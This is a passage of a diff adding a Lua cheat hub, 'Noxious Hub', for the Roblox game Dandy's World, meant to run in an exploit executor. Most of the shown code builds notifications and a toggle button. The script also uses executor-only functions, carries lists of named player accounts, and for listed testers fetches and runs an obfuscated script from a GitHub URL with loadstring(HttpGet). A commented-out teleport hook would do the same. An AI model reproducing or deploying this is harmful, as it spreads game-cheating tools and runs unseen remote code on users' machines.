+		writefile(noxious["secret file"], "Qwelver?")
+	end
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["screen gui"] = Instance.new("ScreenGui")
+noxious["screen gui"]["Name"] = noxious["randomized name"]
+noxious["screen gui"]["ResetOnSpawn"] = false
+
+if noxious["in studio"] then
+	noxious["screen gui"]["Parent"]= game["Players"]["LocalPlayer"]:WaitForChild("PlayerGui")
+else
+	noxious["screen gui"]["Parent"] = gethui and gethui() or game["CoreGui"]
+end
+
+noxious["default white color"] = Color3.new(1, 1, 1)
+noxious["default image color"] = Color3.new(1, 1, 1)
+noxious["default gray color"] = Color3.new(0.5, 0.5, 0.5)
+noxious["default black color"] = Color3.new(0, 0, 0)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["user input service"] = game["UserInputService"]
+noxious["run service"] = game["Run Service"]
+noxious["tween service"] = game["TweenService"]
+noxious["http service"] = game["HttpService"]
+noxious["marketplace service"] = game["MarketplaceService"]
+noxious["teleport service"] = game["Teleport Service"]
+noxious["text chat service"] = game["TextChatService"]
+noxious["replicated storage"] = game["ReplicatedStorage"]
+noxious["virtual input manager"] = game:GetService("VirtualInputManager")
+
+noxious["player gui"] = noxious["screen gui"]["Parent"]
+noxious["players"] = game["Players"]
+
+noxious["local player"] = noxious["players"]["LocalPlayer"]
+noxious["is mobile?"] = noxious["user input service"]["TouchEnabled"]
+noxious["username"] = noxious["local player"]["Name"]
+noxious["display name"] = noxious["local player"]["DisplayName"]
+noxious["user id"] = noxious["local player"]["UserId"]
+
+function updcharrefs(char)
+	noxious["character"] = char 
+	noxious["humanoid"] = char:WaitForChild("Humanoid") 
+	noxious["humanoid root part"] = char:WaitForChild("HumanoidRootPart")
+end
+
+if noxious["local player"]["Character"] then updcharrefs(noxious["local player"]["Character"]) end
+noxious["local player"]["CharacterAdded"]:Connect(function(char) updcharrefs(char) end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["qtp"] = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
+
+noxious["local player"]["OnTeleport"]:Connect(function()
+	-- noxious["qtp"]([[loadstring(game:HttpGet("https://raw.githubusercontent.com/meowsynther/team-noxious-obfuscated/refs/heads/main/dandy's%20world/%5Bobf%5D%20%5Bmain%5D%20noxious%20hub.lua"))()]])
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["admins"] = { "boxtenkeyes", "decompyler", "stymuli", "zestyassboxten", "astrosconstellations", "boxtenwhimperaudio", "ProchaineStation", "unaqle", "hyqnic", "CerebralAneurysms", "stupiddumbpastry", "StrikerRode", "noxiousholder", "ihatedandysword", "DWNoxiousTester", "hxpxotic", "exherxal", "Plectora", "furbound", "9sght", "protogenfemboys", "BellasPerspective", "franticboxten", "NoxiousTester1", "NoxiousTester2", "NoxiousTester3", "stupiddumbfishbowl", "c00lunable", "cnutboyastro", "cnutboycosmo", "BellAss1232", "stupiddumbmusicalbox", "fembeyboxten", "stupiddumbrollcake" }
+
+noxious["unable"] = { "boxtenkeyes", "decompyler", "astrosconstellations", "boxtenwhimperaudio", "unaqle", "c00lunable", "stupiddumbmusicalbox", "uwunable", "CerebralAneurysms" }
+noxious["undercover unable"] = { "unab_e", "quwuelver", "BoxtomBotten", "Boxtom_Botten", }
+
+noxious["hypnic"] = { "hyqnic", "stymuli" }
+
+noxious["donors"] = { "h7kY8a7Ghc85H4Ko8jTi", "novabrasque", "stymuli", 
+	"absoloutedummy", "asphyxyation", "boxtenwhimperaudio", "femcosmo", 
+	"fembeys", "boxtenishot", "hyqnic", "astrosconstellations", "erikbl99", 
+	"katabrasque", "lullabyshipper", "infraultra", "stupiddum8ball", "supernicew0lf",
+	"ProchaineStation", "fullboxtened", "banESCAPED", "meowsynther", "edgarfunky",
+	"LittleHulkshaver", "astro_thenumber1", "grtgrtrtgrt1", "StrikerRode", "CC54PHTQB4",
+	"O6x5k", "imhackdandy3", "LITTLE_Runner111", "hola43i", "DysfunctionAhhDih69", "Fobeoas",
+	"Sasarealsmooth0", "DANDYSBINMOD", "W4gyued", "MallowAlola", "dishwasherrinsecycle", 
+	"mallowsthirdalt", "TeaganSkinnyFan", "testaccountnumber834", "skibidiandandlol", 
+	"overoveroveragainWHY", "Pebbletherockala", "NpcHunter453", "1_S0up70", "esdfdxg22", 
+	"fakk69facc69", "ibWPQUHaINSaNe531", "1S0up10", "Calmyourcheeks14", "hitzuga", "maximoracca",
+	"SupahCalifragilist", "SupahBerd", "mysubmarineimploded", "Supah_Berd", "qwelvercalled",
+	"ilovedwsqwelver", "stuffisreallyreal", "SOMERANDOMTESTACC_XD", "ILOVEDANDYSWORLDDDX",
+	"ethan14801", "n0e728", "lifeis_happiness3", "ibnuhaikyuu", "ibnuskibididop", "ibnuskibididop1",
+	"8948771866", "7943713387", "8908306965", "8874164963", "8510781480", "3031987904",
+	"7902245011", "5237462282", "1740963170", "4200662419", "7954768662", "8512844086",
+	"8265374040", "628774151", "8221409612", "8157671260", "7539016416", "3406504497",
+	"3406504497", "7620161079", "8097761023", "4547379933", "455158923", "74092747",
+	"8225047181", "4295524481", "8250886848", "8325876488", "7851506317", "7255740842",
+	"7677671516", "5108703442", "7923031607", "3109664777", "7896575696", "7733493037",
+	"1640589346", "7968985418", "7624544170", "2562946080", "692227", "761287170",
+	-- "ABABABABABABABABABABABBABABABA", "ABABABABABABABABABABABBABABABA", "ABABABABABABABABABABABBABABABA", "ABABABABABABABABABABABBABABABA", "ABABABABABABABABABABABBABABABA", "ABABABABABABABABABABABBABABABA",
+}
+noxious["testers"] = { "boxtenkeyes", "stymuli", "boxtenwhimperaudio", "novabrasque", "asphyxyation", "fembeys", "zestyassboxten", "astrosconstellations", "hyqnic", "femcosmo", "erikbl99", "lullabyshipper", "invalidparams", "stupiddum8ball", "tssogurt", "supernicew0lf", "boxcest", "fullboxtened", "banESCAPED", "meowsynther", "unaqle", "edgarfunky", "LittleHulkshaver", "astro_thenumber1", "grtgrtrtgrt1", "StrikerRode", "CC54PHTQB4", "O6x5k", "imhackdandy3", "LITTLE_Runner111", "hola43i", "DysfunctionAhhDih69", "Fobeoas", "Sasarealsmooth0", "DANDYSBINMOD", "W4gyued", "MallowAlola", "dishwasherrinsecycle", "mallowsthirdalt", "TeaganSkinnyFan", "testaccountnumber834", "skibidiandandlol", "overoveroveragainWHY", "Pebbletherockala", "NpcHunter453", "1_S0up70", "esdfdxg22", "fakk69facc69", "ibWPQUHaINSaNe531", "1S0up10", "Calmyourcheeks14", "hitzuga", "maximoracca", "SupahCalifragilist", "SupahBerd", "mysubmarineimploded", "Supah_Berd", "qwelvercalled", "ilovedwsqwelver", "stuffisreallyreal", "SOMERANDOMTESTACC_XD", "ILOVEDANDYSWORLDDDX", "ethan14801", "n0e728", "lifeis_happiness3", "ibnuhaikyuu", "ibnuskibididop", "ibnuskibididop1", }
+
+noxious["cosmo orbiter"] = { "femcosmo", "overoveroveragainWHY", "stupiddumbrollcake", "stupiddumbpastry", "CosmoLovver", "CosmoLovvver" }
+noxious["shrimpo orbiter"] = { "helllllllllllllooALT", "shrimpcest", "chuufromlewna0", "eggydropkick", "TheLostTwentyNine", "edgarfunky", "decompyler", "javierre14", "Loongies23", "masterMingTheCool", "ihatedandysword", "UwUunicornPrincess1o", "NpcHunter453", "MaxwellTheKitty1", "Maddi_ealala" }
+noxious["boxten orbiter"] = { "boxtenkeyes", "asphyxyation" }
+
+noxious["qwelver"] = { "Qwelver" }
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+if noxious["marketplace service"]:UserOwnsGamePassAsync(noxious["user id"], 1085884381) then
+	table.insert(noxious["donors"], noxious["username"])
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+task.wait(0.2)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function istester(username)
+	for _, dev in ipairs(noxious["testers"]) do
+		if dev == username then
+			return true
+		end
+	end
+	return false
+end
+
+if noxious["testing"] == true then
+	if istester(noxious["username"]) then
+		_G.dswdnoxiousloaded = false
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/meowsynther/team-noxious-obfuscated/refs/heads/main/dandy's%20world/developer/%5Bobf%5D%20%5Btest%5D%20noxious%20hub.lua"))()
+		return
+	end
+end
+
+--[[
+function istester(username)
+	for _, dev in ipairs(noxious["testers"]) do
+		if dev == username then
+			return true
+		end
+	end
+	return false
+end
+
+if not istester(noxious["username"]) then
+	return
+end
+]]--
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function iscosmo(username)
+	for _, dev in ipairs(noxious["cosmo orbiter"]) do
+		if dev == username then
+			return true
+		end
+	end
+	return false
+end
+
+function isunable(username)
+	for _, dev in ipairs(noxious["unable"]) do
+		if dev == username then
+			return true
+		end
+	end
+	return false
+end
+
+function ishypnic(username)
+	for _, dev in ipairs(noxious["hypnic"]) do
+		if dev == username then
+			return true
+		end
+	end
+	return false
+end
+
+function undercover(username)
+	for _, dev in ipairs(noxious["undercover unable"]) do
+		if dev == username then
+			return true
+		end
+	end
+	return false
+end
+
+function teammember(username)
+	for _, dev in ipairs(noxious["admins"]) do
+		if dev == username then
+			return true
+		end
+	end
+	return false
+end
+
+function donor(user)
+	for _, dev in ipairs(noxious["donors"]) do
+		if dev == user or tostring(dev) == tostring(user) then
+			return true
+		end
+	end
+	return false
+end
+
+function notdonor(username)
+	for _, dev in ipairs(noxious["donors"]) do
+		if dev ~= username then
+			return true
+		end
+	end
+	return false
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["active notifications"] = {}
+
+noxious["notification sound"] = "rbxassetid://8503529139"
+noxious["error sound"] = "rbxassetid://489103549"
+noxious["warning sound"] = "rbxassetid://5914602124"
+
+local function notify(message, duration, variant)
+	local borderColor = noxious["default white color"]
+	local textColor = noxious["default white color"]
+	local timerframecolor = noxious["default white color"]
+	local playbackspeed = 1
+	local topframetext = "Noxious Hub: Dandy's World"
+
+	if variant == "unableishere" then
+		topframetext = "Noxious Hub: Dandy's World"
+		borderColor = Color3.new(0.2, 0.2, 1)
+		textColor = Color3.new(0.2, 0.2, 1)
+		timerframecolor = Color3.new(0.2, 0.2, 1)
+		playbackspeed = 0.7
+	end
+
+	if variant == "aceishere" then
+		topframetext = "Noxious Hub: Dandy's World"
+		borderColor = Color3.fromRGB(156, 175, 136)
+		textColor = Color3.fromRGB(156, 175, 136)
+		timerframecolor = Color3.fromRGB(156, 175, 136)
+		playbackspeed = 0.7
+	end
+
+	if variant == "hypnicishere" then
+		topframetext = "Noxious Hub: Dandy's World"
+		borderColor = Color3.fromRGB(180, 180, 180)
+		textColor = Color3.fromRGB(180, 180, 180)
+		timerframecolor = Color3.fromRGB(180, 180, 180)
+		playbackspeed = 0.7
+	end
+
+	if variant == "tmishere" then
+		topframetext = "Noxious Hub: Dandy's World"
+		borderColor = Color3.new(0.5, 0.5, 0.5)
+		textColor = Color3.new(0.5, 0.5, 0.5)
+		timerframecolor = Color3.new(0.5, 0.5, 0.5)
+		playbackspeed = 0.7
+	end
+
+	if variant == "qwelverishere" then
+		topframetext = "Noxious Hub: Dandy's World"
+		borderColor = Color3.new(1, 0.4, 1)
+		textColor = Color3.new(1, 0.4, 1)
+		timerframecolor = Color3.new(1, 0.4, 1)
+		playbackspeed = 0.7
+	end
+
+	local notifsound = Instance.new("Sound")
+	notifsound.SoundId = noxious["notification sound"]
+	notifsound.PlaybackSpeed = playbackspeed
+	notifsound.Parent = game.Workspace
+	notifsound.Volume = 2
+
+	if variant == "error" then
+		borderColor = Color3.new(1, 0.3, 0.3)
+		textColor = Color3.new(1, 0.3, 0.3)
+		topframetext = "Noxious Hub: Dandy's World"
+		timerframecolor = Color3.new(1, 0.3, 0.3)
+		notifsound.SoundId = noxious["error sound"]
+		notifsound.Volume = 1.6
+		notifsound.TimePosition = 0.05
+		notifsound.PlaybackSpeed = 0.8
+	end
+
+	if variant == "warning" then
+		borderColor = Color3.new(1, 1, 0.4)
+		topframetext = "Noxious Hub: Dandy's World"
+		textColor = Color3.new(1, 1, 0.4)
+		timerframecolor = Color3.new(1, 1, 0.4)
+		notifsound.SoundId = noxious["warning sound"]
+		notifsound.Volume = 1
+		notifsound.TimePosition = 0.2
+		notifsound.PlaybackSpeed = 0.8
+	end
+
+	local scale = 0.85
+
+	local notifframe = Instance.new("Frame")
+	notifframe.Name = "block"
+	notifframe.Size = UDim2.new(0, 390 * scale, 0, 90 * scale)
+	notifframe.Position = UDim2.new(1, 500 * scale, 1, -10 * scale)
+	notifframe.AnchorPoint = Vector2.new(1, 1)
+	notifframe.BackgroundColor3 = noxious["default black color"]
+	notifframe.BackgroundTransparency = 0.6
+	notifframe.BorderColor3 = borderColor
+	notifframe.BorderSizePixel = 1
+	notifframe.Parent = noxious["screen gui"]
+
+	local notifframeline = Instance.new("Frame")
+	notifframeline.Name = "block"
+	notifframeline.Size = UDim2.new(0, 1, 0, 90 * scale)
+	notifframeline.Position = UDim2.new(0, 0, 1, 1)
+	notifframeline.AnchorPoint = Vector2.new(1, 1)
+	notifframeline.BackgroundColor3 = borderColor
+	notifframeline.BackgroundTransparency = 0
+	notifframeline.BorderSizePixel = 0
+	notifframeline.Parent = notifframe
+
+	local notifframeline2 = Instance.new("Frame")
+	notifframeline2.Name = "block"
+	notifframeline2.Size = UDim2.new(0, 1, 0, 90 * scale)
+	notifframeline2.Position = UDim2.new(0, 390 * scale + 1, 1, 1)
+	notifframeline2.AnchorPoint = Vector2.new(1, 1)
+	notifframeline2.BackgroundColor3 = borderColor
+	notifframeline2.BackgroundTransparency = 0
+	notifframeline2.BorderSizePixel = 0
+	notifframeline2.Parent = notifframe
+
+	local notifframeline3 = Instance.new("Frame")
+	notifframeline3.Name = "block"
+	notifframeline3.Size = UDim2.new(0, 390 * scale, 0, 1)
+	notifframeline3.Position = UDim2.new(1, 0, 0, 90 * scale + 1)
+	notifframeline3.AnchorPoint = Vector2.new(1, 1)
+	notifframeline3.BackgroundColor3 = borderColor
+	notifframeline3.BackgroundTransparency = 0
+	notifframeline3.BorderSizePixel = 0
+	notifframeline3.Parent = notifframe
+
+	local notifshadow = Instance.new("ImageLabel")
+	notifshadow.Size = notifframe.Size + UDim2.new(0, 14, 0, 14)
+	notifshadow.Position = UDim2.new(0, -7, 0, -6)
+	notifshadow.BackgroundTransparency = 1
+	notifshadow.Image = "rbxassetid://1316045217"
+	notifshadow.ImageColor3 = Color3.new(0, 0, 0)
+	notifshadow.ImageTransparency = 0.3
+	notifshadow.ScaleType = Enum.ScaleType.Slice
+	notifshadow.SliceCenter = Rect.new(10, 10, 90, 90)
+	notifshadow.Parent = notifframe
+
+	local notiftopframe = Instance.new("Frame")
+	notiftopframe.Name = "block"
+	notiftopframe.Size = UDim2.new(1, 0, 0, 24 * scale)
+	notiftopframe.Position = UDim2.new(0, 0, 0, 0)
+	notiftopframe.BackgroundColor3 = noxious["default black color"]
+	notiftopframe.BackgroundTransparency = 0.2
+	notiftopframe.BorderColor3 = borderColor
+	notiftopframe.BorderSizePixel = 1
+	notiftopframe.Parent = notifframe
+
+	local notifytopframetxt = Instance.new("TextLabel")
+	notifytopframetxt.Name = "block"
+	notifytopframetxt.Size = UDim2.new(1, -10 * scale, 1, 0)
+	notifytopframetxt.Position = UDim2.new(0, 5 * scale, 0, -0.6)
+	notifytopframetxt.BackgroundTransparency = 1
+	notifytopframetxt.TextColor3 = textColor
+	notifytopframetxt.Text = topframetext
+	notifytopframetxt.Font = Enum.Font.Nunito
+	notifytopframetxt.TextSize = 21.6 * scale
+	notifytopframetxt.TextScaled = false
+	notifytopframetxt.TextXAlignment = Enum.TextXAlignment.Left
+	notifytopframetxt.Parent = notiftopframe
+
+	local closenotif = Instance.new("TextButton")
+	closenotif.Name = "block"
+	closenotif.Size = UDim2.new(0, 23 * scale, 0, 23 * scale)
+	closenotif.Position = UDim2.new(1, -23 * scale, 0, 0)
+	closenotif.BackgroundColor3 = noxious["default black color"]
+	closenotif.BorderSizePixel = 0
+	closenotif.BorderColor3 = borderColor
+	closenotif.BackgroundTransparency = 0
+	closenotif.Text = "X"
+	closenotif.Font = Enum.Font.Nunito
+	closenotif.TextColor3 = textColor
+	closenotif.TextSize = 20 * scale
+	closenotif.Parent = notiftopframe
+	closenotif.MouseButton1Click:Connect(function()
+		playclicksound()
+	end)
+
+	local closenotiftxtp = Instance.new("UIPadding")
+	closenotiftxtp.PaddingTop = UDim.new(0, 1)
+	closenotiftxtp.PaddingLeft = UDim.new(0, 1)
+	closenotiftxtp.Parent = closenotif
+
+	local notiftimerframe = Instance.new("Frame")
+	notiftimerframe.Name = "block"
+	notiftimerframe.Size = UDim2.new(0, 390 * scale, 0, 6 * scale)
+	notiftimerframe.Position = UDim2.new(0, 0, 0, 25 * scale)
+	notiftimerframe.BackgroundColor3 = noxious["default black color"]
+	notiftimerframe.BorderColor3 = borderColor
+	notiftimerframe.BorderSizePixel = 1
+	notiftimerframe.BackgroundTransparency = 0
+	notiftimerframe.Parent = notifframe
+
+	local notiftimer = Instance.new("Frame")
+	notiftimer.Name = "block"
+	notiftimer.Size = UDim2.new(1, 0, 1, 0)
+	notiftimer.Position = UDim2.new(0, 0, 0, 0)
+	notiftimer.BackgroundColor3 = timerframecolor
+	notiftimer.BorderSizePixel = 0
+	notiftimer.BackgroundTransparency = 0.5
+	notiftimer.Parent = notiftimerframe
+
+	local function createShakingText(parent, text, textColor, scale, duration)
+		noxious["notiftxt container"] = Instance.new("Frame")
+		noxious["notiftxt container"].Size = UDim2.new(0.97, -9 * scale, 0, 64 * scale)
+		noxious["notiftxt container"].Position = UDim2.new(0, 10 * scale, 0, 29 * scale)
+		noxious["notiftxt container"].BackgroundTransparency = 1
+		noxious["notiftxt container"].ClipsDescendants = true
+		noxious["notiftxt container"].Parent = parent
+
+		local letters = {}
+		local basePosX = 0
+
+		local textService = game:GetService("TextService")
+		local fontSize = 21.6 * scale
+		local font = Enum.Font.Nunito
+
+		for i = 1, #text do
+			local letter = string.sub(text, i, i)
+			noxious["notiftxt label"] = Instance.new("TextLabel")
+			noxious["notiftxt label"].BackgroundTransparency = 1
+			noxious["notiftxt label"].TextColor3 = textColor
+			noxious["notiftxt label"].Font = font
+			noxious["notiftxt label"].TextSize = fontSize
+			noxious["notiftxt label"].TextScaled = false
+			noxious["notiftxt label"].TextWrapped = false
+			noxious["notiftxt label"].TextXAlignment = Enum.TextXAlignment.Left
+			noxious["notiftxt label"].Text = letter
+			noxious["notiftxt label"].Size = UDim2.new(0, 0, 1, 0)
+			noxious["notiftxt label"].Position = UDim2.new(0, basePosX, 0, 0)
+			noxious["notiftxt label"].Parent = noxious["notiftxt container"]
+			noxious["notiftxt label"].ZIndex = 12138
+
+			local textSize = textService:GetTextSize(letter, fontSize, font, Vector2.new(1000, 1000))
+			noxious["notiftxt label"].Size = UDim2.new(0, textSize.X, 1, 0)
+
+			table.insert(letters, {
+				label = noxious["notiftxt label"],
+				baseX = basePosX,
+				baseY = 0
+			})
+
+			basePosX = basePosX + textSize.X
+		end
+
+		local runService = game:GetService("RunService")
+		local startTime = tick()
+		local shakeDuration = math.min(3, duration)
+		local maxIntensity = 1.5
+
+		local shakeConnection
+		shakeConnection = runService.RenderStepped:Connect(function()
+			local elapsed = tick() - startTime
+			if elapsed > shakeDuration then
+				shakeConnection:Disconnect()
+				for _, info in ipairs(letters) do
+					info.label.Position = UDim2.new(0, info.baseX, 0, info.baseY)
+				end
+				return
+			end
+
+			local intensity = (1 - elapsed / shakeDuration) * maxIntensity
+
+			for _, info in ipairs(letters) do
+				local offsetX = (math.random() - 0.25) * 2 * intensity
+				local offsetY = (math.random() - 0.1) * 2 * intensity
+				info.label.Position = UDim2.new(0, info.baseX + offsetX, 0, info.baseY + offsetY)
+			end
+		end)
+
+		return noxious["notiftxt container"]
+	end
+
+	if variant == "unableishere" or variant == "qwelverishere" or variant == "hypnicishere" or variant == "tmishere" or variant == "aceishere" then
+		if noxious["notiftxt"] then
+			noxious["notiftxt"]:Destroy()
+		end
+		createShakingText(notifframe, message, textColor, scale, duration)
+	else
+		noxious["notiftxt"] = Instance.new("TextLabel")
+		noxious["notiftxt"].Name = "block"
+		noxious["notiftxt"].Size = UDim2.new(0.97, -9 * scale, 0, 64 * scale)
+		noxious["notiftxt"].Position = UDim2.new(0, 10 * scale, 0, 29 * scale)
+		noxious["notiftxt"].BackgroundTransparency = 1
+		noxious["notiftxt"].TextColor3 = textColor
+		noxious["notiftxt"].Text = message
+		noxious["notiftxt"].Font = Enum.Font.Nunito
+		noxious["notiftxt"].TextSize = 21.6 * scale
+		noxious["notiftxt"].TextScaled = false
+		noxious["notiftxt"].TextWrapped = true
+		noxious["notiftxt"].TextXAlignment = Enum.TextXAlignment.Left
+		noxious["notiftxt"].Parent = notifframe
+		noxious["notiftxt"].ZIndex = 12138
+	end
+
+	closenotif.ZIndex = 12140
+	notiftimer.ZIndex = 12139
+	notifytopframetxt.ZIndex = 12139
+	notiftimerframe.ZIndex = 12138
+	notiftopframe.ZIndex = 12138
+	notifframeline3.ZIndex = 12138
+	notifframeline2.ZIndex = 12138
+	notifframeline.ZIndex = 12138
+	notifframe.ZIndex = 12137
+	notifshadow.ZIndex = 12136
+
+	if variant == "unableishere" or variant == "qwelverishere" or variant == "plethoraishere" or variant == "tmishere" or variant == "aceishere" or variant == "hypnicishere" then
+		local blueSound = Instance.new("Sound")
+		blueSound.SoundId = "rbxassetid://836142578"
+		blueSound.Volume = 0.9
+		blueSound.Parent = noxious["toggle interface visibility button"]
+		blueSound.PlaybackSpeed = 0.9
+		blueSound.TimePosition = 0.0613
+		blueSound:Play()
+		blueSound.Ended:Connect(function()
+			blueSound:Destroy()
+		end)
+	end
+
+	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut)
+	notifsound:Play()
+
+	table.insert(noxious["active notifications"], 1, notifframe)
+
+	for i, frame in ipairs(noxious["active notifications"]) do
+		local newTargetPosition = UDim2.new(1, -10 * scale, 1, -10 * scale - ((i - 1) * 100 * scale))
+		local adjustTween = noxious["tween service"]:Create(
+			frame,
+			TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+			{Position = newTargetPosition}
+		)
+		adjustTween:Play()
+	end
+
+	local slideInTween = noxious["tween service"]:Create(
+		notifframe,
+		tweenInfo,
+		{Position = UDim2.new(1, -10 * scale, 1, -10 * scale)}
+	)
+	slideInTween:Play()
+
+	local barTweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+	local barTween = noxious["tween service"]:Create(notiftimer, barTweenInfo, {Size = UDim2.new(0, 0, 1, 0)})
+	barTween:Play()
+
+	local isClosed = false
+
+	local function closenotiffunc()
+		if isClosed or not notifframe.Parent then return end
+		isClosed = true
+
+		barTween:Cancel()
+
+		local slideOutTween = noxious["tween service"]:Create(
+			notifframe,
+			TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
+			{Position = UDim2.new(1, 450 * scale, notifframe.Position.Y.Scale, notifframe.Position.Y.Offset)}
+		)
+		slideOutTween:Play()
+
+		slideOutTween.Completed:Once(function()
+			for i = #noxious["active notifications"], 1, -1 do
+				if noxious["active notifications"][i] == notifframe then
+					table.remove(noxious["active notifications"], i)
+					break
+				end
+			end
+
+			for i, frame in ipairs(noxious["active notifications"]) do
+				local newTargetPosition = UDim2.new(1, -10 * scale, 1, -10 * scale - ((i - 1) * 100 * scale))
+				local adjustTween = noxious["tween service"]:Create(
+					frame,
+					TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+					{Position = newTargetPosition}
+				)
+				adjustTween:Play()
+			end
+
+			if notifframe and notifframe.Parent then
+				notifframe:Destroy()
+			end
+		end)
+	end
+
+	closenotif.MouseButton1Click:Connect(closenotiffunc)
+
+	task.spawn(function()
+		task.wait(duration)
+		closenotiffunc()
+	end)
+
+	if variant == "unableishere" or variant == "qwelverishere" or variant == "plethoraishere" or variant == "tmishere" or variant == "aceishere" or variant == "error" or variant == "warning" or variant == "hypnicishere" then
+		local colorTweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+
+		local borderColorTween = noxious["tween service"]:Create(notiftopframe, colorTweenInfo, {BorderColor3 = Color3.new(1, 1, 1)})
+		local borderColorTween2 = noxious["tween service"]:Create(notifframe, colorTweenInfo, {BorderColor3 = Color3.new(1, 1, 1)})
+		local borderColorTween3 = noxious["tween service"]:Create(closenotif, colorTweenInfo, {BorderColor3 = Color3.new(1, 1, 1)})
+		local borderColorTween4 = noxious["tween service"]:Create(notiftimerframe, colorTweenInfo, {BorderColor3 = Color3.new(1, 1, 1)})
+		local borderColorTween5 = noxious["tween service"]:Create(notifframeline, colorTweenInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
+		local borderColorTween6 = noxious["tween service"]:Create(notifframeline2, colorTweenInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
+		local borderColorTween7 = noxious["tween service"]:Create(notifframeline3, colorTweenInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
+		if not noxious["notiftxt"] then noxious["text tween"] = noxious["tween service"]:Create(noxious["notiftxt label"], colorTweenInfo, {TextColor3 = Color3.new(1, 1, 1)}) end
+		local textColorTween2 = noxious["tween service"]:Create(notifytopframetxt, colorTweenInfo, {TextColor3 = Color3.new(1, 1, 1)})
+		local textColorTween3 = noxious["tween service"]:Create(closenotif, colorTweenInfo, {TextColor3 = Color3.new(1, 1, 1)})
+		if noxious["notiftxt"] then noxious["text tween 4"] = noxious["tween service"]:Create(noxious["notiftxt"], colorTweenInfo, {TextColor3 = Color3.new(1, 1, 1)}) end
+		local timerColorTween = noxious["tween service"]:Create(notiftimer, colorTweenInfo, {BackgroundColor3 = Color3.new(1, 1, 1)})
+
+		if not noxious["notiftxt"] then
+			for _, letterLabel in ipairs(noxious["notiftxt container"]:GetChildren()) do
+				if letterLabel:IsA("TextLabel") then
+					local letterColorTween = noxious["tween service"]:Create(letterLabel, colorTweenInfo, {
+						TextColor3 = Color3.new(1, 1, 1)
+					})
+					letterColorTween:Play()
+				end
+			end
+		end
+
+		borderColorTween:Play()
+		borderColorTween2:Play()
+		borderColorTween3:Play()
+		borderColorTween4:Play()
+		borderColorTween5:Play()
+		borderColorTween6:Play()
+		borderColorTween7:Play()
+		if not noxious["notiftxt"] then noxious["text tween"]:Play() end
+		textColorTween2:Play()
+		textColorTween3:Play()
+		if noxious["notiftxt"] then noxious["text tween 4"]:Play() end
+		timerColorTween:Play()
+	end
+end
+
+function closeallnotifs()
+	for _, frame in ipairs(noxious["active notifications"]) do
+		if frame and frame.Parent then
+			local slideOutTween = noxious["tween service"]:Create(
+				frame,
+				TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
+				{Position = UDim2.new(1, 350, frame.Position.Y.Scale, frame.Position.Y.Offset)}
+			)
+			slideOutTween:Play()
+
+			slideOutTween.Completed:Connect(function()
+				if frame.Parent then
+					frame:Destroy()
+				end
+			end)
+		end
+	end
+
+	noxious["active notifications"] = {}
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function inlobby() 
+	if game.PlaceId == noxious["dandy's world lobby"] then 
+		return true 
+	end 
+	return false 
+end
+
+function inrun() 
+	if game.PlaceId == noxious["dandy's world run"] then 
+		return true 
+	end 
+	return false 
+end
+
+function inrp() 
+	if game.PlaceId == noxious["dandy's world roleplay server"] then 
+		return true 
+	end 
+	return false 
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["toggle interface visibility button"] = Instance.new("ImageButton")
+noxious["toggle interface visibility button"].Name = "NoxiousButton"
+noxious["toggle interface visibility button"].Size = UDim2.new(0, 52, 0, 52)
+noxious["toggle interface visibility button"].BorderSizePixel = 0
+noxious["toggle interface visibility button"].BorderColor3 = noxious["default white color"]
+noxious["toggle interface visibility button"].ImageColor3 = noxious["default white color"]
+noxious["toggle interface visibility button"].Visible = false
+noxious["toggle interface visibility button"].Parent = noxious["screen gui"]
+noxious["toggle interface visibility button"].Image = "rbxassetid://130584446591314"
+noxious["toggle interface visibility button"].ImageColor3 = noxious["default image color"]
+
+function movebutton()
+	local screenWidth = game:GetService"Workspace".CurrentCamera.ViewportSize.X
+
+	local buttonWidth = 48
+
+	local centerX = (screenWidth - buttonWidth) / 2
+	local topMargin = 20
+	local centerY = topMargin
+
+	noxious["toggle interface visibility button"].Position = UDim2.new(0, centerX, 0, centerY - 150)
+
+	local offsetY = 148
+	local targetPosition = UDim2.new(0, centerX, 0, centerY - offsetY)
+
+	local tweenInfoUp = TweenInfo.new(0, Enum.EasingStyle.Back, Enum.EasingDirection.Out, 0, false, 0)
+
+	local tweenUp = noxious["tween service"]:Create(noxious["toggle interface visibility button"], tweenInfoUp, {Position = targetPosition})
+
+	local function moveButtonBack()
+		local tweenInfoDown = TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.Out, 0, false, 0)
+
+		local tweenDown = noxious["tween service"]:Create(noxious["toggle interface visibility button"], tweenInfoDown, {Position = UDim2.new(0, centerX, 0, centerY)})
+
+		tweenDown:Play()
+	end
+
+	noxious["toggle interface visibility button"].Visible = true
+	tweenUp:Play()
+
+	tweenUp.Completed:Wait()
+	moveButtonBack()
+end
+
+noxious["tivb border"] = Instance.new("Frame")
+noxious["tivb border"].Size = UDim2.new(0, 54, 0, 54)
+noxious["tivb border"].Position = UDim2.new(0, -1, 0, -1)
+noxious["tivb border"].BackgroundColor3 = noxious["default white color"]
+noxious["tivb border"].BorderSizePixel = 0
+noxious["tivb border"].ZIndex = 2
